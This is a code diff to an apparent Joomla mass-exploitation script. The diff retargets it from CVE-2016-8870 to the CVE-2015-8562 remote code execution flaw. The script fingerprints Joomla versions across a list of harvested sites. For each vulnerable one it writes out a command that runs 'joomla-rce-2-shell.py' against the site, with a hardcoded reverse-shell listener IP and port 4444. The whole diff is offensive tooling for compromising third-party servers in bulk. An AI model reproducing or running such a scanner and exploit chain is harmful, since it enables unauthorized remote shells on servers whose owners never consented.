@@ -12,10 +12,12 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 lock = threading.Lock()
 
 
-class Joomla_CVE_2016_8870():
+class Joomla_CVE_2015_8562():
 
-    def __init__(self, filename):
+    def __init__(self, filename, revshell, port):
         self.filename = filename
+        self.revshell = revshell
+        self.port = port
         self.urls = self.joomla_cve()
 
     @staticmethod
@@ -28,7 +30,7 @@ class Joomla_CVE_2016_8870():
         print("██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗")
         print("██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║")
         print("╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝")
-        print("       Joomla CVE 2016 8870 Checker - anarcoder at protonmail.com\n") 
+        print("       Joomla CVE 2015 8562 Checker - anarcoder at protonmail.com\n") 
 
     def remove_duplicate_targets(self):
         results = [line.rstrip('\n') for line in open(self.filename)]
@@ -67,16 +69,12 @@ class Joomla_CVE_2016_8870():
                             options = lh.fromstring(req2.content)
                             joomla_version = options.xpath(
                                 '//version/text()')[0]
-                            print('First attempt - Not vulnerable')
-                            print(joomla_version + '\n')
                             # Second attemtp to get joomla version
                             if joomla_version == '90.90.90':
                                 req = get(req.url + joomver2, headers=headers)
                                 options = lh.fromstring(req2.content)
                                 joomla_version = options.xpath(
                                     '//version/text()')[0]
-                                print('Second attempt - Not Vulnerable')
-                                print(joomla_version + '\n')
                         except:
                             # No joomla version
                             q.task_done()
@@ -84,14 +82,13 @@ class Joomla_CVE_2016_8870():
                 except:
                     q.task_done()
                     pass
-                if self.version(joomla_version) >= self.version('3.4.4') and self.version(joomla_version) <= self.version('3.6.4'):
+                if self.version(joomla_version) < self.version('3.4.6'):
                     print('[+] Target: ' + req.url)
                     print('[+] Possible vulnerable')
                     print('[+] Joomla: ' + joomla_version + '\n')
-                    cmd = "echo python2 joomraa.py -u anarc0der -p anarc0der "\
-                          "-e anarc0der@anarc0der.com {0} >> "\
-                          "../exploits/vuln_joomla_2016_8870.txt"\
-                          .format(req.url)
+                    cmd = 'echo python2 joomla-rce-2-shell.py -t {0} -l {1} '\
+                          '-p {2} >> ../exploits/vuln_joomla_2015_8562.txt\n'\
+                          .format(req.url, self.revshell, self.port)
                     os.system(cmd)
                 q.task_done()
 
@@ -123,7 +120,9 @@ class Joomla_CVE_2016_8870():
 
 def main():
     filename = '../google_results.txt'
-    Joomla_CVE_2016_8870(filename)
+    revshell = '189.61.111.244'
+    port = 4444
+    Joomla_CVE_2015_8562(filename, revshell, port)
 
 
 if __name__ == '__main__':
